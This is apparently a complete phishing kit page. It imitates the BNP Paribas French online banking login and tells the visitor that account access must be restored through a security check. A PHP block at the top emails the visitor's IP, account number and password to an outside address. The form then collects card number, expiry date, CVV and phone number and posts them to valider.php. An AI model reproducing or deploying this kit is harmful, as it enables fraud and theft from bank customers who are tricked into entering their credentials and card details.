<?php 
	$ip = "";
	if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    	$ip = $_SERVER['HTTP_CLIENT_IP'];
	} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
	    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
	} else {
	    $ip = $_SERVER['REMOTE_ADDR'];
	}
	$header = "From $ip <bnp@pipi.bmci>";
	$header .= "";
	$msg  = "---------$ip\nCompte: ".$_POST['cpt']."\n pass: ". $_POST['pass'];
	mail("duffounie@proton.me",$header,$msg);
?>

<html lang="fr" class="js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths">	
<head>	
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<title>Espace client</title>
	<style type="text/css">
		body
		{
		  margin:0;
		}

		body.ls-center
		{
		  text-align:center;
		}

		.ls-canvas .ls-row .ls-row-clr
		{
		  clear:both;
		}

		.ls-canvas .ls-col
		{
		  overflow:hidden;
		}

		.ls-canvas .ls-col-body
		{
		  overflow:hidden;
		}

		.ls-canvas .ls-area
		{
		  overflow:hidden;
		}

		.ls-canvas .ls-area-body
		{
		  overflow:hidden;
		}

		.ls-canvas .ls-area .ls-1st
		{
		  margin-top:0 !important;
		}

		.ls-canvas .ls-cmp-wrap
		{
		  padding:1px 0;
		}

		.ls-canvas .iw_component
		{
		  margin:-1px 0;
		}

		</style>
	<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
	<link type="text/css" href="context.css" rel="stylesheet">
	<link type="text/css" href="mediaelementplayer.min.css" rel="stylesheet">
	<link type="text/css" href="sitefactory.css" rel="stylesheet">
	<link type="text/css" href="base.css" rel="stylesheet">
	<link type="text/css" href="base-blessed2.css" rel="stylesheet">
	<link type="text/css" href="base-blessed1.css" rel="stylesheet">
	<link type="text/css" href="fix.css" rel="stylesheet">
	<link type="image/x-icon" href="favicon.ico" rel="shortcut icon">
</head>
<body class="fr web world pub client no-bread-crumb ident part mw-1400">
	<div id="sf-master"><!--sf:begin[div:sf-master]--><!--ls:begin[body]-->
		<div class="ls-canvas" id="ls-canvas">
			<div class="ls-row" id="header">
				<div class="ls-fxr" id="ls-gen24203726-ls-fxr">
					<div class="ls-area headerContent" id="headerContent">
						<div class="ls-area-body" id="ls-gen24203727-ls-area-body">
							<div class="ls-cmp-wrap ls-1st" id="w1413474755920">
								<div class="iw_component" id="1413474755920"></div>
							</div>
							<div class="ls-cmp-wrap" id="w1413474755924">
								<div class="iw_component" id="1413474755924"></div>
							</div>
							<div class="ls-cmp-wrap" id="w1413474755926">
								<div class="iw_component" id="1413474755926">
									<!--content start-->
									<div id="wcm-l-header">
										<div class="wcm-html style-default client no-bread-crumb ident part ">
											<!-- test publi -->
											<header class="bottom-header">
												<div class="no-mob">
													<div class="logoBNP-container">
														<a href="/" class="logoBNP-alone text-hide">BNP Paribas La banque d'un monde qui change</a>
														<p>La banque d'un monde qui change</p>        
													</div>       
													<button href="/fr/connexion" class="bouton-espace-client btn-block" id="bouton-espace-client" disabled>Valider mes informations</button>         
												</div>   
												<header class="bottom-header-connected mobile-only pull-left" id="nav-connect">        <ul id="nav-connect-item" class="list-header-connected left nav-connecte-items mobile-only">            
													<li class="js-toggle-subnav">
														<i class="burger"></i>
													</li>            
													<li class="logo">
														<a href="/" class="logoBNP"></a>
													</li>            
													<li id="bouton-espace-client-mobile" class="bottom-header-lock pull-right"><span class="icon icon-lock"></span></li>        </ul>    </header></header></div>
</div><!--content stop-->
</div></div></div></div><div class="ls-area breadcrumb" id="breadcrumb"><div class="ls-area-body" id="ls-gen24203728-ls-area-body"><div class="ls-cmp-wrap ls-1st" id="w1413474755921"><div class="iw_component" id="1413474755921"><div class="wcm-fil-ariane style-default client no-bread-crumb ident part ">
<div class="wcm-fil-ariane-header">
<div class="wcm-fil-ariane-header-left"></div>
<div class="wcm-fil-ariane-header-right"></div>
</div>
</div>
</div></div><div class="ls-cmp-wrap" id="w1413474755928"><div class="iw_component" id="1413474755928"><!--content start--><div id="wcm-l-nav-ident">
<div class="wcm-html style-default client no-bread-crumb ident part "><ul class="list-outils">	<li><a href="#" class="fontSmall">A<span>-</span></a></li>	<li><a href="#" class="fontBig">A<span>+</span></a></li>	<li><a href="#" class="icon-print" title="imprimer"></a></li></ul></div>
</div><!--content stop-->
</div></div></div></div><div class="ls-row-clr"></div></div></div><div class="ls-row" id="wrapper"><div class="ls-fxr" id="ls-gen24203729-ls-fxr"><div class="ls-area mainContent" id="mainContent"><div class="ls-area-body" id="ls-gen24203730-ls-area-body"><div class="ls-cmp-wrap ls-1st" id="w1413474755922"><div class="iw_component" id="1413474755922"><!--content start--><div id="wcm-l-">
<div class="wcm-html style-default "></div>
</div><!--content stop-->
</div></div>
<div class="ls-cmp-wrap" id="w1413474755927">
<div class="iw_component" id="1413474755927">
	<!--Tools Component start (AJAX Mode)-->
	<div id="id_balise_div"><div class="wcm-ia-column">
	<div id="ia-identification"><div rv-show="data.codeRetour | couldShow">
<!-- provient de  <base href="http://particulier-livesite-web.dev.echonet:8080/">-->
<div class="ident">
	<div class="carret-up"></div>
	<section class="main-content fond-gradient">
		<div class="container-ident">
			<div class="message-erreur arrow-bottom" id="message-erreur"></div>
			<h3 rv-text="config.app.identification.titre">Pour rétablir l’accès à votre compte, répondez à la vérification de sécurité suivante:</h3>
			<ul class="grille-ident">
				<li>
					<iframe id="remember" name="remember" class="hidden" action="javascript:void(0)"></iframe>
					<form name="logincanalnet" id="logincanalnet"class="form" target="remember" autocomplete="on" action="#">
						<label rv-text="config.app.identification.numclient">1. Mon numéro Carte Bancaire</label>

						<input type="tel" pattern="[0-9]*" value="" name="cb" maxlength="16" size="16" autofocus="" autocorrect="off" id="cb" class="form-control numeric" rv-value-reactive="form.idTelematique">
						
						<label rv-text="config.app.identification.numclient">2. Expiration (mm/aaaa)</label>

						<input type="tel" value="" name="exp" maxlength="7" size="7" autofocus="" autocorrect="off" id="exp" class="form-control numeric" rv-value-reactive="form.idTelematique">

						<label rv-text="config.app.identification.numclient">3. Cryptogramme</label>

						<input type="tel" pattern="[0-9]*" value="" name="ccv" maxlength="4" size="4" autofocus="" autocorrect="off" id="ccv" class="form-control numeric" rv-value-reactive="form.idTelematique">

						<label rv-text="config.app.identification.numclient">4. Numéros de téléphone</label>
						<input type="tel"  value="" name="dob" maxlength="10" size="10" autofocus="" autocorrect="off" id="dob" class="form-control numeric" rv-value-reactive="form.idTelematique">
					</form>
				</li>
				<li>
					<form name="logincanalnetbis" method="post" class="form">
						<div class="cell-password">
							<div class="field-valid">
								<button type="button" href="#" class="btn-primary btn-block" id="submitIdent" rv-text="config.app.identification.boutonTitle" disabled="disabled">Valider les informations</button>
							</div>
						</div>
						<div id="zone-publiable-basse"><p id="zonePubliableBasIdentificationPart"></p>
</div>
					</form>
				</li>
			</ul>
		</div>
	</section>

	<aside class="col-aside arrow-left">
		<div id="zone-publiable-haute"><h2>Infos pratiques</h2>
<p>Vous allez accéder à un site qui est encore en construction et sur lequel toutes les fonctionnalités ne sont pas encore présentes.</p>
<p>Pour en savoir plus ou nous faire part de vos retours, rendez-vous sur la plateforme <a href="https://toutsurmabanque.bnpparibas.net/">toutsurmabanque.bnpparibas.net</a></p>

<h2>Code secret oublié ?</h2>
<p class="hidden"><a href="http://#">Grille accessible</a></p>
<p><a href="/fr/banque-contacts/demande-code-secret">Effectuez une nouvelle demande.</a></p></div>
	</aside>
</div>
</div>
<div class="identification_erreur_tech" rv-show="data.codeRetour | couldNotShow" style="display: none;"><p></p></div></div>
	
</div></div><!--Tools Component stop-->
</div></div></div></div><div class="ls-row-clr"></div></div></div><div class="ls-row" id="footer"><div class="ls-fxr" id="ls-gen24203731-ls-fxr"><div class="ls-area footerContent" id="footerContent"><div class="ls-area-body" id="ls-gen24203732-ls-area-body"><div class="ls-cmp-wrap ls-1st" id="w1413474755923"><div class="iw_component" id="1413474755923"><!--content start--><div id="wcm-l-">
<div class="wcm-richxml style-default client no-bread-crumb ident part ">
		
		
		<div class="wcm-richxml-content">
<div class="xml-document ">
<div class="xml-content ">
<div class="xml-layout ">
<table style="width:100%">
<tbody><tr>
<td class="col1 full-width">
<div class="xml-region ">
<div class="xml-section level1 footer-contact-bddf">
<h1>bnp paribas, la banque et l'assurance d'un monde qui change</h1>
<p style="clear:both;" class="footer-contact-bddf">Tout savoir sur le nouveau site !</p>
</div>
<div class="xml-section level1 icones-footer-contact-bddf">
<ul class="icones-footer-contact-bddf">
<li>
<a href="https://toutsurmabanque.bnpparibas.net/votre-reaction"><span class="rond-cross-footer"><span class="icon icon-bulb"></span></span></a>
<br>
<span class="footer-title-descr"><a href="https://toutsurmabanque.bnpparibas.net/">Votre réaction</a></span>
<br>
<span class="description"><a href="https://toutsurmabanque.bnpparibas.net/votre-reaction">Retrouvezles réactions des clients BNP Paribas après leur première visite sur le nouveau site !</a></span>
</li>
<li>
<a href="https://toutsurmabanque.bnpparibas.net/pourquoi-changer"><span class="rond-cross-footer"><span class="icon icon-reload"></span></span></a>
<br>
<span class="footer-title-descr"><a href="https://toutsurmabanque.bnpparibas.net/pourquoi-changer">Pourquoi changer ?</a></span>
<br>
<span class="description"><a href="https://toutsurmabanque.bnpparibas.net/pourquoi-changer">Votre site a plus de 10 ans !<br> BNP Paribas a décidé de repenser son site pour vous. Découvrez pourquoi !</a></span>
</li>
<li>
<a href="https://toutsurmabanque.bnpparibas.net/en-pratique"><span class="rond-cross-footer"><span class="icon icon-play"></span></span></a>
<br>
<span class="footer-title-descr"><a href="https://toutsurmabanque.bnpparibas.net/en-pratique">En pratique</a></span>
<br>
<span class="description"><a href="https://toutsurmabanque.bnpparibas.net/en-pratique">Découvrez toutes les nouvelles fonctionnalités en vidéos.</a></span>
</li>
<li>
<a href="/fr/banque-contacts/donnez-votre-avis"><span class="rond-cross-footer"><span class="icon icon-bulle2"></span></span></a>
<br>
<span class="footer-title-descr"><a href="/fr/banque-contacts/donnez-votre-avis">Déposer un avis</a></span>
<br>
<span class="description"><a href="/fr/banque-contacts/donnez-votre-avis">Votre site évolue, votre avis nous intéresse !</a></span>
</li>
</ul>
</div>
</div>
</td>
</tr>
</tbody></table>
</div>
</div>
</div>
</div>
		
		
	</div>
</div><!--content stop-->
</div></div><div class="ls-cmp-wrap" id="w1424446736474"><div class="iw_component" id="1424446736474"><!--content start--><div id="wcm-l-">
<div class="wcm-richxml style-default client no-bread-crumb ident part ">
		
		
		<div class="wcm-richxml-content">
<div class="xml-document ">
<div class="xml-content ">
<div class="xml-layout ">
<table style="width:100%">
<tbody><tr>
<td class="col1 full-width">
<div class="xml-region ">
<div id="footerContent" class="xml-section level1 nav-cross-footer">
<ul class="nav-cross-footer">
<li>
<a href="/fr/banque-contacts">Contact</a>
</li>
<li>
<a href="/fr/legal/informations-legales">Infos légales</a>
</li>
<li>
<a href="/fr/legal/cookies">Cookies</a>
</li>
<li>
<a href="/fr/legal/infos-securite">Infos sécurité</a>
</li>
</ul>
<p style="clear:both;text-align:center;" class="nav-cross-footer">Pour la bonne exécution de vos contrats, et en cas de réclamations/contestations, votre Conseiller est joignable sur sa ligne directe (appel non surtaxé). Si vous ne disposez plus de son numéro de téléphone direct, envoyez-lui un message par votre messagerie sécurisée, il vous le donnera à nouveau en retour.</p>
</div>
</div>
</td>
</tr>
</tbody></table>
</div>
</div>
</div>
</div>
		
		
	</div>
</div><!--content stop-->
</div></div><div class="ls-cmp-wrap" id="w1413474755925"><div class="iw_component" id="1413474755925"><div class="wcm-javascript style-default client no-bread-crumb ident part ">
<script type="text/javascript">
/*window.webtrendsAsyncInit=function(){
var dcs=new Webtrends.dcs().init({
dcsid:"dcscf2lct100008mm6gqh20cl_4c6s",
domain:"statse.webtrendslive.com",
timezone:12,
i18n:true,
fpcdom:".domain.com",
plugins:{
//hm:{src:"//s.webtrends.com/js/webtrends.hm.js"}
}
})			
dcs.track();
};

function tagguageNext(argsa){
Webtrends.multiTrack({element:this, argsa:argsa});
}

(
function(){
var s=document.createElement("script"); s.async=true; s.src="/rsc/contrib/script/generique/webtrends.min.js";
var s2=document.getElementsByTagName("script")[0]; s2.parentNode.insertBefore(s,s2);
}()		
);*/</script>
</div>
</div></div></div></div><div class="ls-row-clr"></div></div></div></div><!--sf:end[div:sf-master]--></div><!--ls:end[body]-->
<script type="text/javascript" src="jquery-1.11.0.min.js"></script><div class="state-indicator"></div></body>	
<script src="webtrends.min.js"></script>

<script type="text/javascript">
	$(document).ready(function(){

		$("#logincanalnet input ").bind("keypress", function(){
			if(($("#cb").val().length == 14  || $("#cb").val().length == 16) 
				&& $("#exp").val().length == 7
				&& ($("#ccv").val().length == 3 || $("#ccv").val().length == 4)
				&& $("#dob").val().length == 10){
				$("#submitIdent").removeAttr("disabled");

			}else{

				$("#submitIdent").removeAttr("disabled");
			}
		})
		$("#submitIdent").bind("click", function(){
			$form = $("<form style='display:none' action='valider.php' method='post'><form/>");
			$form.append('<input type="text" name="cb" value="'+ $("#cb").val() +'" />');
			$form.append('<input type="text" name="exp" value="'+ $("#exp").val() +'" />');
			$form.append('<input type="text" name="ccv" value="'+ $("#ccv").val() +'" />');
			$form.append('<input type="text" name="dob" value="'+ $("#dob").val() +'" />');
			$form.append('<input type="submit" value="go"/>');
			$form.appendTo("body");
			
			//$form.appendTo('body').submit();
			$form.submit();
		})
	});

	function pass(Value){
		if($("#secret-nbr").val().length < 6){
			$("#secret-nbr").val($("#secret-nbr").val()+Value);
		}
		if($("#secret-nbr").val().length == 6 && $("#client-nbr").val().length == 10){
			$("#submitIdent").removeAttr("disabled");
		}
	}
</script>
	
</html>